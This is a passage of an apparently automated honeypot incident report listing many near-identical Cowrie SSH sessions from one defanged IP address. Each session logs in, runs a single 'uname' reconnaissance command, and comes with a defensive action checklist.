| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:53` | `cowrie.session.connect` |
| `2026-08-20 19:26:53` | `cowrie.client.version` |
| `2026-08-20 19:26:53` | `cowrie.client.kex` |
| `2026-08-20 19:27:02` | `cowrie.login.success` |
| `2026-08-20 19:27:06` | `cowrie.session.params` |
| `2026-08-20 19:27:06` | `cowrie.command.input` |
| `2026-08-20 19:27:09` | `cowrie.log.closed` |
| `2026-08-20 19:27:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-326569723c3a

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:53` | `cowrie.session.connect` |
| `2026-08-20 19:26:53` | `cowrie.client.version` |
| `2026-08-20 19:26:53` | `cowrie.client.kex` |
| `2026-08-20 19:27:05` | `cowrie.login.success` |
| `2026-08-20 19:27:11` | `cowrie.session.params` |
| `2026-08-20 19:27:11` | `cowrie.command.input` |
| `2026-08-20 19:27:11` | `cowrie.log.closed` |
| `2026-08-20 19:27:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf982ba9c874

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:53` | `cowrie.session.connect` |
| `2026-08-20 19:26:53` | `cowrie.client.version` |
| `2026-08-20 19:26:53` | `cowrie.client.kex` |
| `2026-08-20 19:26:57` | `cowrie.login.success` |
| `2026-08-20 19:27:01` | `cowrie.session.params` |
| `2026-08-20 19:27:01` | `cowrie.command.input` |
| `2026-08-20 19:27:02` | `cowrie.log.closed` |
| `2026-08-20 19:27:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0e8169e45fe

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:53` | `cowrie.session.connect` |
| `2026-08-20 19:26:53` | `cowrie.client.version` |
| `2026-08-20 19:26:55` | `cowrie.client.kex` |
| `2026-08-20 19:27:01` | `cowrie.login.success` |
| `2026-08-20 19:27:03` | `cowrie.session.params` |
| `2026-08-20 19:27:03` | `cowrie.command.input` |
| `2026-08-20 19:27:06` | `cowrie.log.closed` |
| `2026-08-20 19:27:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c89a11c21446

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:53` | `cowrie.session.connect` |
| `2026-08-20 19:26:53` | `cowrie.client.version` |
| `2026-08-20 19:26:53` | `cowrie.client.kex` |
| `2026-08-20 19:26:57` | `cowrie.login.success` |
| `2026-08-20 19:27:00` | `cowrie.session.params` |
| `2026-08-20 19:27:00` | `cowrie.command.input` |
| `2026-08-20 19:27:01` | `cowrie.log.closed` |
| `2026-08-20 19:27:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-224d8bc7fee7

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:55` | `cowrie.session.connect` |
| `2026-08-20 19:26:55` | `cowrie.client.version` |
| `2026-08-20 19:26:56` | `cowrie.client.kex` |
| `2026-08-20 19:26:57` | `cowrie.login.success` |
| `2026-08-20 19:27:02` | `cowrie.session.params` |
| `2026-08-20 19:27:02` | `cowrie.command.input` |
| `2026-08-20 19:27:02` | `cowrie.log.closed` |
| `2026-08-20 19:27:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2f7f40e4a30

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:55` | `cowrie.session.connect` |
| `2026-08-20 19:26:55` | `cowrie.client.version` |
| `2026-08-20 19:26:56` | `cowrie.client.kex` |
| `2026-08-20 19:27:08` | `cowrie.login.success` |
| `2026-08-20 19:27:23` | `cowrie.session.params` |
| `2026-08-20 19:27:23` | `cowrie.command.input` |
| `2026-08-20 19:27:26` | `cowrie.log.closed` |
| `2026-08-20 19:27:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-baa87e0f7c31

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:55` | `cowrie.session.connect` |
| `2026-08-20 19:26:55` | `cowrie.client.version` |
| `2026-08-20 19:26:57` | `cowrie.client.kex` |
| `2026-08-20 19:27:02` | `cowrie.login.success` |
| `2026-08-20 19:27:04` | `cowrie.session.params` |
| `2026-08-20 19:27:04` | `cowrie.command.input` |
| `2026-08-20 19:27:23` | `cowrie.log.closed` |
| `2026-08-20 19:27:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38a75386737e

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:56` | `cowrie.session.connect` |
| `2026-08-20 19:26:56` | `cowrie.client.version` |
| `2026-08-20 19:26:57` | `cowrie.client.kex` |
| `2026-08-20 19:27:00` | `cowrie.login.success` |
| `2026-08-20 19:27:07` | `cowrie.session.params` |
| `2026-08-20 19:27:07` | `cowrie.command.input` |
| `2026-08-20 19:27:11` | `cowrie.log.closed` |
| `2026-08-20 19:27:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3042b27e6ccd

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:56` | `cowrie.session.connect` |
| `2026-08-20 19:26:56` | `cowrie.client.version` |
| `2026-08-20 19:26:57` | `cowrie.client.kex` |
| `2026-08-20 19:27:00` | `cowrie.login.success` |
| `2026-08-20 19:27:05` | `cowrie.session.params` |
| `2026-08-20 19:27:05` | `cowrie.command.input` |
| `2026-08-20 19:27:09` | `cowrie.log.closed` |
| `2026-08-20 19:27:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d91b4ce2887c

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 44s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:57` | `cowrie.session.connect` |
| `2026-08-20 19:26:57` | `cowrie.client.version` |
| `2026-08-20 19:26:57` | `cowrie.client.kex` |
| `2026-08-20 19:27:02` | `cowrie.login.success` |
| `2026-08-20 19:27:38` | `cowrie.session.params` |
| `2026-08-20 19:27:38` | `cowrie.command.input` |
| `2026-08-20 19:27:41` | `cowrie.log.closed` |
| `2026-08-20 19:27:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cbe4f8c039e

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:26 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:26:57` | `cowrie.session.connect` |
| `2026-08-20 19:26:57` | `cowrie.client.version` |
| `2026-08-20 19:27:00` | `cowrie.client.kex` |
| `2026-08-20 19:27:11` | `cowrie.login.success` |
| `2026-08-20 19:27:15` | `cowrie.session.params` |
| `2026-08-20 19:27:15` | `cowrie.command.input` |
| `2026-08-20 19:27:19` | `cowrie.log.closed` |
| `2026-08-20 19:27:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9997a06e4203

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 23s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:00` | `cowrie.session.connect` |
| `2026-08-20 19:27:00` | `cowrie.client.version` |
| `2026-08-20 19:27:02` | `cowrie.client.kex` |
| `2026-08-20 19:27:11` | `cowrie.login.success` |
| `2026-08-20 19:27:18` | `cowrie.session.params` |
| `2026-08-20 19:27:18` | `cowrie.command.input` |
| `2026-08-20 19:27:23` | `cowrie.log.closed` |
| `2026-08-20 19:27:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1ac4d14ebe1

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:00` | `cowrie.session.connect` |
| `2026-08-20 19:27:00` | `cowrie.client.version` |
| `2026-08-20 19:27:02` | `cowrie.client.kex` |
| `2026-08-20 19:27:11` | `cowrie.login.success` |
| `2026-08-20 19:27:13` | `cowrie.session.params` |
| `2026-08-20 19:27:13` | `cowrie.command.input` |
| `2026-08-20 19:27:17` | `cowrie.log.closed` |
| `2026-08-20 19:27:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f9a7099c5b83

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:02` | `cowrie.session.connect` |
| `2026-08-20 19:27:02` | `cowrie.client.version` |
| `2026-08-20 19:27:02` | `cowrie.client.kex` |
| `2026-08-20 19:27:11` | `cowrie.login.success` |
| `2026-08-20 19:27:12` | `cowrie.session.params` |
| `2026-08-20 19:27:12` | `cowrie.command.input` |
| `2026-08-20 19:27:14` | `cowrie.log.closed` |
| `2026-08-20 19:27:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1a1fcf6f41f2

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:02` | `cowrie.session.connect` |
| `2026-08-20 19:27:02` | `cowrie.client.version` |
| `2026-08-20 19:27:06` | `cowrie.client.kex` |
| `2026-08-20 19:27:13` | `cowrie.login.success` |
| `2026-08-20 19:27:19` | `cowrie.session.params` |
| `2026-08-20 19:27:19` | `cowrie.command.input` |
| `2026-08-20 19:27:22` | `cowrie.log.closed` |
| `2026-08-20 19:27:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32974b1cb61f

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:06` | `cowrie.session.connect` |
| `2026-08-20 19:27:08` | `cowrie.client.version` |
| `2026-08-20 19:27:09` | `cowrie.client.kex` |
| `2026-08-20 19:27:13` | `cowrie.login.success` |
| `2026-08-20 19:27:17` | `cowrie.session.params` |
| `2026-08-20 19:27:17` | `cowrie.command.input` |
| `2026-08-20 19:27:20` | `cowrie.log.closed` |
| `2026-08-20 19:27:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bd6ff67ad05f

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:06` | `cowrie.session.connect` |
| `2026-08-20 19:27:08` | `cowrie.client.version` |
| `2026-08-20 19:27:09` | `cowrie.client.kex` |
| `2026-08-20 19:27:14` | `cowrie.login.success` |
| `2026-08-20 19:27:19` | `cowrie.session.params` |
| `2026-08-20 19:27:19` | `cowrie.command.input` |
| `2026-08-20 19:27:22` | `cowrie.log.closed` |
| `2026-08-20 19:27:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c41d8694d4fe

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 30s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:06` | `cowrie.session.connect` |
| `2026-08-20 19:27:09` | `cowrie.client.version` |
| `2026-08-20 19:27:11` | `cowrie.client.kex` |
| `2026-08-20 19:27:19` | `cowrie.login.success` |
| `2026-08-20 19:27:28` | `cowrie.session.params` |
| `2026-08-20 19:27:28` | `cowrie.command.input` |
| `2026-08-20 19:27:36` | `cowrie.log.closed` |
| `2026-08-20 19:27:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-256b56071667

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:06` | `cowrie.session.connect` |
| `2026-08-20 19:27:09` | `cowrie.client.version` |
| `2026-08-20 19:27:09` | `cowrie.client.kex` |
| `2026-08-20 19:27:12` | `cowrie.login.success` |
| `2026-08-20 19:27:15` | `cowrie.session.params` |
| `2026-08-20 19:27:15` | `cowrie.command.input` |
| `2026-08-20 19:27:16` | `cowrie.log.closed` |
| `2026-08-20 19:27:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-efe495d217e0

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:06` | `cowrie.session.connect` |
| `2026-08-20 19:27:09` | `cowrie.client.version` |
| `2026-08-20 19:27:09` | `cowrie.client.kex` |
| `2026-08-20 19:27:12` | `cowrie.login.success` |
| `2026-08-20 19:27:16` | `cowrie.session.params` |
| `2026-08-20 19:27:16` | `cowrie.command.input` |
| `2026-08-20 19:27:19` | `cowrie.log.closed` |
| `2026-08-20 19:27:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e7208478e9fe

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:06` | `cowrie.session.connect` |
| `2026-08-20 19:27:09` | `cowrie.client.version` |
| `2026-08-20 19:27:09` | `cowrie.client.kex` |
| `2026-08-20 19:27:15` | `cowrie.login.success` |
| `2026-08-20 19:27:20` | `cowrie.session.params` |
| `2026-08-20 19:27:20` | `cowrie.command.input` |
| `2026-08-20 19:27:22` | `cowrie.log.closed` |
| `2026-08-20 19:27:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e9bcfd848ac7

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:09` | `cowrie.session.connect` |
| `2026-08-20 19:27:09` | `cowrie.client.version` |
| `2026-08-20 19:27:11` | `cowrie.client.kex` |
| `2026-08-20 19:27:15` | `cowrie.login.success` |
| `2026-08-20 19:27:22` | `cowrie.session.params` |
| `2026-08-20 19:27:22` | `cowrie.command.input` |
| `2026-08-20 19:27:23` | `cowrie.log.closed` |
| `2026-08-20 19:27:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce86b8f67fa0

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:09` | `cowrie.session.connect` |
| `2026-08-20 19:27:09` | `cowrie.client.version` |
| `2026-08-20 19:27:11` | `cowrie.client.kex` |
| `2026-08-20 19:27:15` | `cowrie.login.success` |
| `2026-08-20 19:27:21` | `cowrie.session.params` |
| `2026-08-20 19:27:21` | `cowrie.command.input` |
| `2026-08-20 19:27:23` | `cowrie.log.closed` |
| `2026-08-20 19:27:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76a911882eea

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:09` | `cowrie.session.connect` |
| `2026-08-20 19:27:09` | `cowrie.client.version` |
| `2026-08-20 19:27:15` | `cowrie.client.kex` |
| `2026-08-20 19:27:20` | `cowrie.login.success` |
| `2026-08-20 19:27:26` | `cowrie.session.params` |
| `2026-08-20 19:27:26` | `cowrie.command.input` |
| `2026-08-20 19:27:28` | `cowrie.log.closed` |
| `2026-08-20 19:27:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea9b8f93fae1

| Field | Detail |
|---|---|
| **Source IP** | `79.175.176[.]177` |
| **First Seen** | 2026-08-20 19:27 |
| **Last Seen** | 2026-08-20 19:27 |
| **Session Duration** | 16s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-20 19:27:11` | `cowrie.session.connect` |
| `2026-08-20 19:27:11` | `cowrie.client.version` |
| `2026-08-20 19:27:12` | `cowrie.client.kex` |
| `2026-08-20 19:27:23` | `cowrie.login.success` |
| `2026-08-20 19:27:24` | `cowrie.session.params` |
| `2026-08-20 19:27:24` | `cowrie.command.input` |
| `2026-08-20 19:27:26` | `cowrie.log.closed` |
| `2026-08-20 19:27:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `79.175.176[.]177` to AbuseIPDB if not already reported
- [ ] Block `79.175.176[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

